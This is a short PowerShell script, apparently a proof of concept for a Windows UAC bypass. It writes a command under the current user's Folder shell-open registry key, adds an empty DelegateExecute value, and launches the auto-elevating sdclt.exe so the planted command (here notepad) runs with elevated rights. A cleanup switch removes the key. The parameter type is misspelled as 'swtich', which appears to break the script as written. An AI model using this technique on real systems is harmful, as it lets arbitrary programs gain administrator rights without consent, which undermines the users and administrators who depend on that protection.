param(
    [swtich]$CleanUp
)

if($CleanUp){
    Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
}
else {
    New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
    New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
    Start-Process -FilePath "$env:windir\system32\sdclt.exe"
}